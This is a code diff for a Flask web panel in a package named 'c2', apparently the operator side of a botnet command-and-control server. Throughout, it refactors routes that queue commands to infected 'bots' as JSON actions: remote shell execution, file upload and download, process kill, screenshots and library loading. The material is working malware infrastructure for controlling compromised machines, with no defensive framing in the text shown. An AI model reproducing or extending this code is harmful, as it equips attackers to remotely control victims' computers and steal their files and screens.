@@ -5,10 +5,24 @@ from flask import request
 from flask import render_template
 from flask import redirect, url_for
 from flask import session
+from enum import Enum
+import json
 
 from c2.database import update_bot_record
 from c2.app import app
 from c2.app import get_db
+
+
+class Verb(Enum):
+    ok = "ok"
+    info = "info"
+    ps = "ps"
+    shell = "shell"
+    upload = "upload"
+    download = "download"
+    kill = "kill"
+    screenshot = "screenshot"
+    loadlibrary = "loadlibrary"
 
 
 @app.route('/action/run', methods=['POST'])
@@ -17,7 +31,10 @@ def actionrun():
         return redirect(url_for('login'))
     if request.method == 'POST':
         conn = get_db()
-        update_bot_record.update_commandqueue(conn, request.form['id'], '4 ' + request.form['cmd'])
+        action = {}
+        action['action'] = Verb.shell.value
+        action['command'] = request.form['cmd']
+        update_bot_record.update_commandqueue(conn, request.form['id'], json.dumps(action))
         return redirect(url_for('bot', id=request.form['id']))
     return 'Error adding command to database'
 
@@ -28,7 +45,10 @@ def actionupload():
         return redirect(url_for('login'))
     if request.method == 'POST':
         conn = get_db()
-        update_bot_record.update_commandqueue(conn, request.form['id'], '5 ' + request.form['path'])
+        action = {}
+        action['action'] = Verb.upload.value
+        action['path'] = request.form['path']
+        update_bot_record.update_commandqueue(conn, request.form['id'], json.dumps(action))
         return redirect(url_for('bot', id=request.form['id']))
     return 'Error adding command to database'
 
@@ -39,7 +59,11 @@ def actiondownload():
         return redirect(url_for('login'))
     if request.method == 'POST':
         conn = get_db()
-        update_bot_record.update_commandqueue(conn, request.form['id'], '6 ' + request.form['url'] + ' ' + request.form['filepath'])
+        action = {}
+        action['action'] = Verb.download.value
+        action['url'] = request.form['url']
+        action['path'] = request.form['filepath']
+        update_bot_record.update_commandqueue(conn, request.form['id'], json.dumps(action))
         return redirect(url_for('bot', id=request.form['id']))
     return 'Error adding command to database'
 
@@ -50,7 +74,10 @@ def actionkill():
         return redirect(url_for('login'))
     if request.method == 'POST':
         conn = get_db()
-        update_bot_record.update_commandqueue(conn, request.form['id'], '7 ' + request.form['pid'])
+        action = {}
+        action['action'] = Verb.kill.value
+        action['pid'] = int(request.form['pid'])
+        update_bot_record.update_commandqueue(conn, request.form['id'], json.dumps(action))
         return redirect(url_for('bot', id=request.form['id']))
     return 'Error adding command to database'
 
@@ -61,9 +88,12 @@ def actioninfo():
         return redirect(url_for('login'))
     if request.method == 'POST':
         conn = get_db()
-        update_bot_record.update_commandqueue(conn, request.form['id'], '2')
+        action = {}
+        action['action'] = Verb.info.value
+        update_bot_record.update_commandqueue(conn, request.form['id'], json.dumps(action))
         return redirect(url_for('bot', id=request.form['id']))
     return 'Error adding command to database'
+
 
 @app.route('/action/ps', methods=['POST'])
 def actionps():
@@ -71,7 +101,9 @@ def actionps():
         return redirect(url_for('login'))
     if request.method == 'POST':
         conn = get_db()
-        update_bot_record.update_commandqueue(conn, request.form['id'], '3')
+        action = {}
+        action['action'] = Verb.ps.value
+        update_bot_record.update_commandqueue(conn, request.form['id'], json.dumps(action))
         return redirect(url_for('bot', id=request.form['id']))
     return 'Error adding command to database'
 
@@ -82,9 +114,12 @@ def actionss():
         return redirect(url_for('login'))
     if request.method == 'POST':
         conn = get_db()
-        update_bot_record.update_commandqueue(conn, request.form['id'], '8')
+        action = {}
+        action['action'] = Verb.screenshot.value
+        update_bot_record.update_commandqueue(conn, request.form['id'], json.dumps(action))
         return redirect(url_for('bot', id=request.form['id']))
     return 'Error adding command to database'
+
 
 @app.route('/action/loadlibrary', methods=['POST'])
 def actionloadlibrary():
@@ -92,7 +127,10 @@ def actionloadlibrary():
         return redirect(url_for('login'))
     if request.method == 'POST':
         conn = get_db()
-        update_bot_record.update_commandqueue(conn, request.form['id'], '9 ' + request.form['librarypath'])
+        action = {}
+        action['action'] = Verb.loadlibrary.value
+        action['path'] = request.form['librarypath']
+        update_bot_record.update_commandqueue(conn, request.form['id'], json.dumps(action))
         return redirect(url_for('bot', id=request.form['id']))
     return 'Error adding command to database'
 
